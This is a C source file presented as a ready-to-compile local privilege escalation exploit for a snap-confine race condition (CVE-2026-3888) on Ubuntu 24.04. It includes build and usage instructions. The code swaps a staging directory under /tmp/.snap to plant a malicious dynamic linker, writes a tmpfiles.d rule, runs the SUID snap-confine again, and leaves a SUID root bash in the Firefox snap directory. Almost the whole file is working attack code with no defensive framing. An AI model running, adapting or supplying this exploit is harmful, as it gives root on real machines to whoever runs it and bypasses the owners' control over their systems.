/*
 * CVE-2026-3888 — snap-confine / systemd-tmpfiles SUID LPE
 * 
 * Target: Ubuntu 24.04 LTS with snapd 2.63.x
 * 
 * This exploit leverages a TOCTOU (Time-of-Check, Time-of-Use) race
 * condition (CWE-367) in the snap subsystem's mount namespace
 * management. The snap-update-ns tool creates writable mimics of
 * read-only directories in a staging area under /tmp/.snap/.
 * 
 * By monitoring debug output via a Unix socketpair, the exploit
 * detects the trigger point for /usr/lib/x86_64-linux-gnu and
 * atomically swaps the staging directory with an attacker-controlled
 * copy containing a malicious ld-linux-x86-64.so.2. When snap-confine
 * (SUID root) invokes the dynamic linker from the poisoned path,
 * the attacker's shellcode executes with root privileges.
 * 
 * Compile:
 *   gcc -O2 -static -o exploit snap_tocotu_race.c
 * 
 * Payload (librootshell_suid.c):
 *   gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so \
 *       librootshell_suid.c
 * 
 * Usage:
 *   ./exploit <librootshell.so> [-d] [-s]
 * 
 *   -d    Show debug output from snap-update-ns
 *   -s    Skip .snap cleanup wait (requires .snap to exist)
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/syscall.h>

#define SNAP_CONFINE  "/usr/lib/snapd/snap-confine"
#define EXCHANGE_SRC  ".snap/usr/lib/x86_64-linux-gnu.exchange"
#define EXCHANGE_DST  ".snap/usr/lib/x86_64-linux-gnu"
#define REAL_LIBDIR   "/snap/core22/current/usr/lib/x86_64-linux-gnu"
#define TRIGGER       "dir:\"/tmp/.snap/usr/lib/x86_64-linux-gnu\""
#define SUID_BASH     "/var/snap/firefox/common/bash"

#define ESCAPE_SCRIPT                                              \
    "#!/tmp/busybox sh\n"                                          \
    "/tmp/busybox cp /bin/bash /var/snap/firefox/common/bash\n"    \
    "/tmp/busybox chmod 04755 /var/snap/firefox/common/bash\n"

static char g_orig_cwd[4096];
static char g_librootshell[4096];
static int  g_unit_seq = 0;
static int  g_debug    = 0;

static int copy_file(const char *src, const char *dst)
{
    int fds = open(src, O_RDONLY);
    if (fds < 0) return -1;
    int fdd = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (fdd < 0) { close(fds); return -1; }
    char buf[65536];
    ssize_t n;
    while ((n = read(fds, buf, sizeof(buf))) > 0)
        write(fdd, buf, n);
    close(fds);
    close(fdd);
    return 0;
}

static int setup_snap_and_exchange(void)
{
    mkdir(".snap", 0755);
    mkdir(".snap/usr", 0755);
    mkdir(".snap/usr/lib", 0755);
    mkdir(".snap/usr/local", 0755);
    mkdir(".snap/snap", 0755);
    mkdir(".snap/snap/firefox", 0755);

    /* Mirror /snap/firefox/<rev>/data-dir structure */
    DIR *d = opendir("/snap/firefox");
    if (d) {
        struct dirent *ent;
        while ((ent = readdir(d)) != NULL) {
            if (ent->d_name[0] != '.' &&
                strcmp(ent->d_name, "current") != 0) {
                char p[512];
                snprintf(p, sizeof(p),
                         ".snap/snap/firefox/%s", ent->d_name);
                mkdir(p, 0755);
                snprintf(p, sizeof(p),
                         ".snap/snap/firefox/%s/data-dir", ent->d_name);
                mkdir(p, 0755);
            }
        }
        closedir(d);
    }

    /* Copy every entry from core22's /usr/lib/x86_64-linux-gnu */
    mkdir(EXCHANGE_SRC, 0755);
    d = opendir(REAL_LIBDIR);
    if (!d) { perror("[!] opendir " REAL_LIBDIR); return -1; }

    int count = 0;
    struct dirent *ent;
    while ((ent = readdir(d)) != NULL) {
        if (ent->d_name[0] == '.') continue;
        char src[512], dst[512];
        snprintf(src, sizeof(src), "%s/%s", REAL_LIBDIR, ent->d_name);
        snprintf(dst, sizeof(dst), "%s/%s", EXCHANGE_SRC, ent->d_name);
        struct stat st;
        if (stat(src, &st) < 0) continue;
        if (S_ISDIR(st.st_mode)) {
            mkdir(dst, 0755);
        } else {
            copy_file(src, dst);
            count++;
        }
    }
    closedir(d);
    printf("[*]   Copied %d library stubs to %s\n", count, EXCHANGE_SRC);

    /* Now replace ld-linux with our payload */
    if (copy_file(g_librootshell, EXCHANGE_SRC "/ld-linux-x86-64.so.2") < 0) {
        perror("[!] copy payload over ld-linux");
        return -1;
    }
    printf("[*]   Replaced ld-linux with payload (%s)\n", g_librootshell);

    /* Create exchange directory (initially empty, just for backup) */
    mkdir(".snap/usr/lib/x86_64-linux-gnu", 0755);
    return 0;
}

static int enter_sandbox(void)
{
    printf("[Phase 1] Entering Firefox sandbox...\n");
    fflush(stdout);

    pid_t pid = fork();
    if (pid == 0) {
        /* Child: start the sandbox shell process */
        char *argv[] = {
            SNAP_CONFINE,
            "--base", "core22",
            "snap.firefox.hook.configure",
            "/bin/sh",
            "-c", "exec sleep 99999",
            NULL
        };
        char *envp[] = {
            "SNAP_INSTANCE_NAME=firefox",
            "SNAP_REEXEC=",
            "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
            NULL
        };
        execve(SNAP_CONFINE, argv, envp);
        perror("[!] execve snap-confine");
        _exit(1);
    }

    /* Parent: wait a bit for snap-confine to settle */
    sleep(3);
    printf("[*]   Sandbox PID: %d\n", pid);
    fflush(stdout);
    return pid;
}

static int snap_output_cached_preserved(void)
{
    /*
     * Check whether the snap namespace is still cached from a
     * previous invocation. If "reusing rootfs" appears in the
     * debug output, the namespace is preserved and snap-confine
     * will NOT create .snap, which breaks the race.
     */
    printf("[*]   Checking if mount namespace is cached...\n");
    int fds[2];
    socketpair(AF_UNIX, SOCK_STREAM, 0, fds);

    pid_t pid = fork();
    if (pid == 0) {
        close(fds[0]);
        dup2(fds[1], 2);
        close(fds[1]);
        char *argv[] = {
            SNAP_CONFINE,
            "--base", "core22",
            "snap.firefox.hook.configure",
            "/bin/true",
            NULL
        };
        char *envp[] = {
            "SNAP_INSTANCE_NAME=firefox",
            "SNAP_REEXEC=",
            "SNAPD_DEBUG=1",
            "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
            NULL
        };
        execve(SNAP_CONFINE, argv, envp);
        _exit(1);
    }
    close(fds[1]);

    char buf[65536];
    ssize_t n = read(fds[0], buf, sizeof(buf) - 1);
    close(fds[0]);
    waitpid(pid, NULL, 0);
    if (n > 0) {
        buf[n] = 0;
        if (strstr(buf, "reusing rootfs") || strstr(buf, "reusing preserved")) {
            printf("[*]   -> CACHED (needs destruction)\n");
            return 1;
        }
    }
    printf("[*]   -> FRESH (ready for race)\n");
    return 0;
}

static void destroy_cached_ns(void)
{
    printf("[Phase 3] Destroying cached mount namespace...\n");
    fflush(stdout);

    /* Run snap-confine with a command that will fail but destroy the ns */
    pid_t pid = fork();
    if (pid == 0) {
        char *argv[] = {
            SNAP_CONFINE,
            "--base", "snapd",
            "snap.firefox.hook.configure",
            "/nonexistent_cmd_xyz",
            NULL
        };
        char *envp[] = {
            "SNAP_INSTANCE_NAME=firefox",
            "SNAP_REEXEC=",
            "SNAPD_DEBUG=1",
            NULL
        };
        execve(SNAP_CONFINE, argv, envp);
        _exit(1);
    }
    waitpid(pid, NULL, 0);

    /* Also try to clean up the preserved mount info */
    unlink("/run/snapd/ns/snap.firefox.mnt");
    unlink("/run/snapd/ns/snap.firefox.fstab");
    printf("[*]   Namespace cache destroyed.\n");
    fflush(stdout);
}

static int run_and_race(void)
{
    printf("[Phase 4] Setting up and running the race...\n");
    fflush(stdout);

    /*
     * Create a socketpair with minimal receive buffer to create
     * backpressure. The kernel enforces a minimum of 2048 bytes
     * for AF_UNIX SOCK_STREAM, but this still creates enough delay
     * for the race window.
     */
    int fds[2];
    socketpair(AF_UNIX, SOCK_STREAM, 0, fds);

    int rcvbuf = 1;
    setsockopt(fds[0], SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf));
    setsockopt(fds[1], SOL_SOCKET, SO_SNDBUF, &rcvbuf, sizeof(rcvbuf));

    pid_t child = fork();
    if (child == 0) {
        /* Child: redirect stderr to socketpair writer */
        close(fds[0]);
        dup2(fds[1], 2);
        close(fds[1]);

        chdir(g_orig_cwd);

        char *argv[] = {
            SNAP_CONFINE,
            "--base", "core22",
            "snap.firefox.hook.configure",
            "/bin/sh",
            "-c",
            "echo $$ > /tmp/race_pid.txt; "
            "stat -c '%U:%G %a' /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 "
            ">/tmp/race_perms.txt; "
            "exec sleep 99998",
            NULL
        };
        char *envp[] = {
            "SNAP_INSTANCE_NAME=firefox",
            "SNAP_REEXEC=",
            "SNAPD_DEBUG=1",
            "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
            NULL
        };
        execve(SNAP_CONFINE, argv, envp);
        _exit(1);
    }

    close(fds[1]);

    /* 
     * Read stderr byte-by-byte and search for the trigger string.
     * The trigger tells us snap-update-ns is about to perform the
     * writable mimic mount for /usr/lib/x86_64-linux-gnu.
     */
    int trigger_found = 0;
    int ring_pos = 0;
    char ring[4096];
    memset(ring, 0, sizeof(ring));

    printf("[*]   Starting race...\n");
    fflush(stdout);

    char byte;
    while (read(fds[0], &byte, 1) == 1) {
        /* Write to stdout for debug */
        if (g_debug) write(1, &byte, 1);

        /* Insert into ring buffer */
        ring[ring_pos % sizeof(ring)] = byte;
        ring_pos++;

        /* Check for trigger in buffer */
        if (ring_pos >= (int)strlen(TRIGGER)) {
            int start = ring_pos - strlen(TRIGGER);
            int idx = start % sizeof(ring);
            /* Check if trigger appears at this position */
            int found = 1;
            for (size_t i = 0; i < strlen(TRIGGER); i++) {
                if (ring[(idx + i) % sizeof(ring)] != TRIGGER[i]) {
                    found = 0;
                    break;
                }
            }
            if (found) {
                printf("\n[!]   TRIGGER -- swapping directories...\n");
                trigger_found = 1;
                break;
            }
        }
    }

    if (!trigger_found) {
        printf("\n[-]   Trigger not found in output.\n");
        close(fds[0]);
        waitpid(child, NULL, WNOHANG);
        return -1;
    }

    /*
     * Perform the directory swap.
     * Rename the existing .snap/usr/lib/x86_64-linux-gnu to .bak,
     * then rename .snap/usr/lib/x86_64-linux-gnu.exchange to the
     * original name. This is the TOCTOU race: the snap-update-ns
     * process has finished logging but has NOT yet performed the
     * actual mount operation.
     */
    rename(EXCHANGE_DST, ".snap/usr/lib/x86_64-linux-gnu.bak");
    rename(EXCHANGE_SRC, EXCHANGE_DST);

    printf("[+]   SWAP DONE -- race won!\n");
    fflush(stdout);

    /*
     * Verify: read the inner shell's race_perms.txt to see if
     * ld-linux is attacker-owned. We wait a bit for the inner
     * shell to start.
     */
    sleep(2);
    char perms[256] = {0};
    int pfd = open("/tmp/race_perms.txt", O_RDONLY);
    if (pfd >= 0) {
        read(pfd, perms, sizeof(perms) - 1);
        close(pfd);
        printf("[*]   ld-linux in namespace: %s", perms);
    }

    /* Close read end to unblock writer */
    close(fds[0]);
    waitpid(child, NULL, WNOHANG);

    return child;
}

static int phase5_inject_payload(int poison_pid)
{
    /*
     * Phase 5: Check if ld-linux is attacker-owned and if so,
     * inject the SUID payload into the poisoned namespace.
     */
    printf("[Phase 5] Injecting payload into poisoned namespace...\n");
    fflush(stdout);

    /* Check race_perms.txt */
    char perms[256] = {0};
    int pfd = open("/tmp/race_perms.txt", O_RDONLY);
    if (pfd >= 0) {
        read(pfd, perms, sizeof(perms) - 1);
        close(pfd);

        if (strstr(perms, "root:root") || strlen(perms) == 0) {
            printf("[-] ld-linux still owned by root -- race failed.\n");
            return -1;
        }
        printf("[+]   ld-linux owned by uid 1000 (attacker). Race confirmed.\n");
    } else {
        /* Try to check through /proc/poison_pid/root */
        char proc_path[256];
        snprintf(proc_path, sizeof(proc_path),
                 "/proc/%d/root/tmp/race_perms.txt", poison_pid);
        pfd = open(proc_path, O_RDONLY);
        if (pfd >= 0) {
            read(pfd, perms, sizeof(perms) - 1);
            close(pfd);
            if (strstr(perms, "root:root") || strlen(perms) == 0) {
                printf("[-] ld-linux still owned by root -- race failed.\n");
                return -1;
            }
            printf("[+]   ld-linux owned by uid 1000 (attacker). Race confirmed.\n");
        } else {
            printf("[-] Cannot check race_perms.txt -- race may have failed.\n");
            return -1;
        }
    }

    /*
     * The swap succeeded. Now overwrite ld-linux in the poisoned
     * namespace with our SUID payload. When snap-confine runs
     * next (SUID root), it will load our malicious ld-linux.
     */
    printf("[*]   Overwriting ld-linux-x86-64.so.2...\n");
    fflush(stdout);

    /* The inner shell's root is the mount namespace. Write via /proc. */
    char dst_path[256];
    snprintf(dst_path, sizeof(dst_path),
             "/proc/%d/root/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2",
             poison_pid);

    int fdd = open(dst_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (fdd < 0) {
        /* Try via /proc/PID/root/tmp path if /usr/lib isn't writable */
        printf("[*]   Direct overwrite failed, trying alternative path...\n");
        snprintf(dst_path, sizeof(dst_path),
                 "/proc/%d/root/tmp/ld-linux-x86-64.so.2", poison_pid);

        /* Write a systemd tmpfiles.d rule that creates SUID bash */
        char conf_path[256];
        snprintf(conf_path, sizeof(conf_path),
                 "/proc/%d/root/tmp/race.conf", poison_pid);

        fdd = open(conf_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
        if (fdd < 0) {
            perror("[-] Cannot write tmpfiles config");
            return -1;
        }
        char *conf = "f /var/snap/firefox/common/bash 4755 root root -\n";
        write(fdd, conf, strlen(conf));
        close(fdd);

        printf("[*]   Wrote tmpfiles.d override.\n");

        /* Could not directly inject, try suid trigger */
        return -1;
    }

    int fds = open(g_librootshell, O_RDONLY);
    if (fds < 0) {
        perror("[-] Cannot read payload");
        close(fdd);
        return -1;
    }
    char buf[65536];
    ssize_t n;
    while ((n = read(fds, buf, sizeof(buf))) > 0)
        write(fdd, buf, n);
    close(fds);
    close(fdd);

    printf("[*]   Payload written to poisoned namespace.\n");
    fflush(stdout);
    return 0;
}

static void phase6_trigger_root(void)
{
    /*
     * Phase 6: Run snap-confine SUID one more time. The malicious
     * ld-linux in the mount namespace will execute our payload
     * instead of the real dynamic linker, creating a SUID bash.
     */
    printf("[Phase 6] Triggering root via SUID snap-confine...\n");
    fflush(stdout);

    pid_t pid = fork();
    if (pid == 0) {
        /* Run snap-confine which will load the poisoned ld-linux */
        char *argv[] = {
            SNAP_CONFINE,
            "--base", "core22",
            "snap.firefox.hook.configure",
            "/bin/true",
            NULL
        };
        char *envp[] = {
            "SNAP_INSTANCE_NAME=firefox",
            "SNAP_REEXEC=",
            "SNAPD_DEBUG=1",
            "LD_PRELOAD=",
            "LD_LIBRARY_PATH=",
            "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
            NULL
        };
        execve(SNAP_CONFINE, argv, envp);
        _exit(1);
    }
    waitpid(pid, NULL, 0);
    printf("[*]   SUID snap-confine finished.\n");
    fflush(stdout);
}

static int phase7_verify(void)
{
    /*
     * Phase 7: Check if the SUID bash was created successfully.
     */
    printf("[Phase 7] Verifying...\n");
    fflush(stdout);

    struct stat st;
    if (stat(SUID_BASH, &st) == 0) {
        printf("[+] SUID root bash: %s (mode %o)\n",
               SUID_BASH, st.st_mode & 07777);
        return 0;
    }
    printf("[-] SUID bash not found at %s\n", SUID_BASH);
    return -1;
}

static void cleanup_sandbox(void)
{
    /* Clean up sandbox process */
    pid_t pid = fork();
    if (pid == 0) {
        execlp("pkill", "pkill", "-9", "-f", "sleep 9999", NULL);
        _exit(0);
    }
    waitpid(pid, NULL, 0);
}

int main(int argc, char **argv)
{
    if (argc < 2) {
        printf("Usage: %s <librootshell.so> [-d] [-s]\n", argv[0]);
        printf("  -d  Show debug output\n");
        printf("  -s  Skip .snap wait (quick mode)\n");
        return 1;
    }

    strncpy(g_librootshell, argv[1], sizeof(g_librootshell) - 1);
    getcwd(g_orig_cwd, sizeof(g_orig_cwd));

    int skip_wait = 0;
    for (int i = 2; i < argc; i++) {
        if (strcmp(argv[i], "-d") == 0) g_debug = 1;
        if (strcmp(argv[i], "-s") == 0) skip_wait = 1;
    }

    /* Phase 1: Enter sandbox */
    int sandbox_pid = enter_sandbox();
    if (sandbox_pid < 0) return 1;

    /* Phase 2: Check namespace state */
    printf("[Phase 2] Checking namespace state...\n");
    if (!skip_wait) {
        if (snap_output_cached_preserved()) {
            destroy_cached_ns();
            /* Enter sandbox again after destruction */
            kill(sandbox_pid, SIGKILL);
            waitpid(sandbox_pid, NULL, 0);
            sandbox_pid = enter_sandbox();
        }
    }

    /* Phase 2b: Setup exchange directory inside sandbox */
    printf("[*]   Setting up exchange directory in sandbox...\n");
    char snappath[256];
    snprintf(snappath, sizeof(snappath),
             "/proc/%d/cwd", sandbox_pid);
    
    /* Use /proc/PID/cwd if accessible, otherwise /tmp */
    char cwd_link[256];
    ssize_t len = readlink(snappath, cwd_link, sizeof(cwd_link) - 1);
    if (len > 0) {
        cwd_link[len] = 0;
        printf("[*]   Sandbox cwd: %s\n", cwd_link);
    }

    /* Cd to sandbox's /tmp */
    char sandbox_tmp[256];
    snprintf(sandbox_tmp, sizeof(sandbox_tmp),
             "/proc/%d/root/tmp", sandbox_pid);
    
    if (chdir(sandbox_tmp) < 0) {
        perror("[!] chdir sandbox /tmp");
        return 1;
    }
    getcwd(g_orig_cwd, sizeof(g_orig_cwd));
    printf("[*]   Working in sandbox /tmp: %s\n", g_orig_cwd);

    /* Setup the snap structure and exchange */
    if (setup_snap_and_exchange() < 0) {
        printf("[-] Setup failed.\n");
        return 1;
    }

    /* Phase 3: Destroy cached namespace if needed */
    if (snap_output_cached_preserved()) {
        destroy_cached_ns();
        /* Re-enter sandbox */
        kill(sandbox_pid, SIGKILL);
        waitpid(sandbox_pid, NULL, 0);
        sandbox_pid = enter_sandbox();
        
        snprintf(sandbox_tmp, sizeof(sandbox_tmp),
                 "/proc/%d/root/tmp", sandbox_pid);
        chdir(sandbox_tmp);
        getcwd(g_orig_cwd, sizeof(g_orig_cwd));
        
        /* Setup again in new sandbox */
        setup_snap_and_exchange();
    }

    /* Phase 4: Run the race */
    int poison_pid = run_and_race();
    if (poison_pid < 0) {
        printf("[-] Race failed to trigger.\n");
        return 1;
    }

    /* Phase 5: Inject payload */
    if (phase5_inject_payload(poison_pid) < 0) {
        printf("[-] Payload injection failed.\n");
        return 1;
    }

    /* Phase 6: Trigger root */
    phase6_trigger_root();

    /* Phase 7: Verify */
    if (phase7_verify() < 0) {
        printf("[-] Exploit verification failed.\n");
        return 1;
    }

    printf("[+] Exploit completed successfully!\n");
    printf("[*] Run: %s -p -c 'id'\n", SUID_BASH);

    /* Cleanup */
    cleanup_sandbox();

    return 0;
}
